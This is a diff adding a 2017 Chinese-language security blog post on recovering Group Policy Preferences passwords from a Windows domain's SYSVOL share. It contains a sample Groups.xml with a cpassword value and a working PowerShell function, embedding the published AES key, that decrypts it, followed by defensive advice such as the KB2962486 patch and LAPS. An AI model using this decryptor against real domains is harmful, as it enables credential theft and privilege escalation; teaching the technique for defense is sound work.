@@ -1,0 +1,297 @@
+<article class="post">
+  <h1>域渗透——利用SYSVOL还原组策略中保存的密码</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>在之前的文章《域渗透——Local Administrator Password Solution》对LAPS的利用进行了分析。使用LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。</p>
+
+<p>那么，如果域内未配置LAPS，如何批量设置域内主机的本地管理员密码呢？这其中又存在哪些可被利用的地方呢？</p>
+
+<p>本文将要介绍如何利用SYSVOL还原组策略中保存的密码，分析技术细节，最后给出防御建议</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>域内共享文件夹\SYSVOL介绍</li>
+  <li>域管理员批量修改域内主机本地管理员密码的方法</li>
+  <li>组策略中可被利用的地方</li>
+  <li>实际测试</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-域内共享文件夹sysvol介绍">0x02 域内共享文件夹\SYSVOL介绍</h2>
+<hr>
+
+<p>在域中，存在一个默认的共享路径：</p>
+
+<p><code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p>
+
+<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>
+
+<p>例如，测试主机所在域为test.local，可访问共享文件夹<code class="language-plaintext highlighter-rouge">\\test.local\SYSVOL\test.local</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-1.png" alt="Alt text"></p>
+
+<h2 id="0x03-域管理员批量修改域内主机本地管理员密码的方法">0x03 域管理员批量修改域内主机本地管理员密码的方法</h2>
+<hr>
+
+<h3 id="1测试server-2003系统">1、测试Server 2003系统</h3>
+
+<p>对于server2003，想要批量修改域内主机本地管理员密码，常常通过配置组策略执行vbs脚本的方式</p>
+
+<p>给出一个修改密码的vbs脚本(实现方式不唯一)，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strComputer = "."
+Set objUser = GetObject("WinNT://" &amp; strComputer &amp; "/Administrator, user")
+objUser.SetPassword "domain123!"
+objUser.SetInfo
+</code></pre></div></div>
+
+<p>这种实现方式，最大的弊端在于修改后的密码会明文保存在vbs脚本中</p>
+
+<p>而该vbs脚本通常会保存在共享文件夹\SYSVOL</p>
+
+<p>这就存在一个隐患:</p>
+
+<p><strong>任何域用户都能读取该vbs脚本，也就能够获取脚本中保存的明文密码</strong></p>
+
+<h3 id="2测试server-2008系统">2、测试Server 2008系统</h3>
+
+<p>对于server 2008，添加了新功能，可使用Group Policy Preferences配置组策略批量修改用户本地管理员密码，具体方法如下：</p>
+
+<p>开始-管理工具-组策略管理</p>
+
+<p>选择域test.local，右键，选中在这个域中创建GPO并在此处链接，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-2.png" alt="Alt text"></p>
+
+<p>设置名称为test6</p>
+
+<p>test6-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组,如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-3.png" alt="Alt text"></p>
+
+<p>更新，administrator(内置),设置密码，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-4.png" alt="Alt text"></p>
+
+<p>委派，设置权限</p>
+
+<p>在详细一栏，可看到该策略对应的ID为<code class="language-plaintext highlighter-rouge">{E6424F10-C44B-4C45-8527-740189CBF60E}</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-5.png" alt="Alt text"></p>
+
+<p>至此，组策略配置完成，域内主机重新登录，即可应用此策略</p>
+
+<p>在共享文件夹\SYSVOL中可看到组策略对应ID的文件夹，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-6.png" alt="Alt text"></p>
+
+<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">\\test.local\SYSVOL\test.local\Policies\{E6424F10-C44B-4C45-8527-740189CBF60E}\User\Preferences\Groups</code></p>
+
+<p>Groups.xml内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt; 
+- &lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;
+- &lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (内置)" image="2" changed="2017-09-25 22:57:53" uid="{463245FF-08D3-4A28-95E7-42AB416DC508}"&gt;
+  &lt;Properties action="U" newName="" fullName="" description="" cpassword="9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (内置)" /&gt; 
+  &lt;/User&gt;
+  &lt;/Groups&gt;
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-7.png" alt="Alt text"></p>
+
+<p>值得注意的是其中的cpassword项，保存的是加密后的内容<code class="language-plaintext highlighter-rouge">"9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"</code></p>
+
+<p>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/cc422924.aspx</p>
+
+<p>借助该私钥，我们就能还原出明文</p>
+
+<p>还原方式可采用Chris Campbell @obscuresec开源的powershell脚本，地址如下：</p>
+
+<p>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</p>
+
+<p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码</p>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/3-1.png" alt="Alt text"></p>
+
+<p>当然，仅仅为了解密<code class="language-plaintext highlighter-rouge">cpassword="9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"</code>，我们可以对以上powershell脚本的功能简化</p>
+
+<p>简化代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Get-DecryptedCpassword {
+    [CmdletBinding()]
+    Param (
+        [string] $Cpassword 
+    )
+
+    try {
+        #Append appropriate padding based on string length  
+        $Mod = ($Cpassword.length % 4)
+        
+        switch ($Mod) {
+        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
+        '2' {$Cpassword += ('=' * (4 - $Mod))}
+        '3' {$Cpassword += ('=' * (4 - $Mod))}
+        }
+
+        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+        
+        #Create a new AES .NET Crypto Object
+        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+        
+        #Set IV to all nulls to prevent dynamic generation of IV value
+        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+        $AesObject.IV = $AesIV
+        $AesObject.Key = $AesKey
+        $DecryptorObject = $AesObject.CreateDecryptor() 
+        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+        
+        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+    } 
+    
+    catch {Write-Error $Error[0]}
+}  
+Get-DecryptedCpassword "9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"
+</code></pre></div></div>
+
+<p>还原出明文密码为domain123!，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/3-2.png" alt="Alt text"></p>
+
+<h2 id="0x04-组策略中可被利用的地方">0x04 组策略中可被利用的地方</h2>
+<hr>
+
+<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>
+
+<p>Services\Services.xml</p>
+<ul>
+  <li>http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</li>
+</ul>
+
+<p>ScheduledTasks\ScheduledTasks.xml</p>
+<ul>
+  <li>http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</li>
+  <li>http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</li>
+  <li>http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</li>
+</ul>
+
+<p>Printers\Printers.xml</p>
+<ul>
+  <li>http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</li>
+</ul>
+
+<p>Drives\Drives.xml</p>
+<ul>
+  <li>http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</li>
+</ul>
+
+<p>DataSources\DataSources.xml</p>
+<ul>
+  <li>http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>位置引用自https://webcache.googleusercontent.com/search?q=cache:MUNO5X9hSwUJ:rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=us</p>
+
+<p>但是以上位置并不绝对，在配置时需要在组策略中填入用户名密码，对应的Groups.xml才会包含cpassword属性，才能用于还原明文</p>
+
+<p>可以拿计划任务来举例，对应ScheduledTasks.xml</p>
+
+<p>组策略配置的位置为：用户配置-首选项-控制面板设置-计划任务</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-1.png" alt="Alt text"></p>
+
+<p>新建任务，需要选中运行身份，填入用户名和密码，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-2.png" alt="Alt text"></p>
+
+<p>否则，不包含cpassword属性，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-3.png" alt="Alt text"></p>
+
+<p>现在填入一个测试密码(密码为testsuccess!，假的)，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-4.png" alt="Alt text"></p>
+
+<p>对应ScheduledTasks.xml也会包含cpassword属性，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-5.png" alt="Alt text"></p>
+
+<p>使用powershell对其解密，还原出密码为testsuccess!</p>
+
+<p>至此得出结论：</p>
+
+<p><strong>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</strong></p>
+
+<p>这就造成了安全隐患，现实中域管理员往往会在组策略中使用域管理员密码,组策略配置文件中的密码很容易被获得，导致权限提升</p>
+
+<p>为此，微软发布了补丁KB2962486，下载地址：</p>
+
+<p>https://technet.microsoft.com/library/security/ms14-025</p>
+
+<p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/5-1.png" alt="Alt text"></p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/5-2.png" alt="Alt text"></p>
+
+<p>当然，共享文件夹\SYSVOL下的xml文件也就不再包含cpassword属性</p>
+
+<p><strong>注：</strong></p>
+
+<p>xml文件还是会和组策略保持同步</p>
+
+<h2 id="0x05-防御">0x05 防御</h2>
+<hr>
+
+<p>结合攻击方法，可供选择的防御方法如下：</p>
+
+<p>1、使用LAPS批量管理域内主机本地管理员帐户</p>
+
+<p>2、域控安装补丁KB2962486</p>
+
+<p>3、不在组策略中使用域控密码</p>
+
+<p>4、设置共享文件夹\SYSVOL的访问权限</p>
+
+<p>5、使用PsPasswd批量修改域内主机本地管理员密码</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr>
+
+<p>本文介绍了如何利用SYSVOL还原组策略中保存的密码，给出了防御建议。如果域用户的本地管理员密码被攻击者获得，默认可被用于在域中远程登录。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on September 25, 2017
+  </div>
+
+  
+</article>
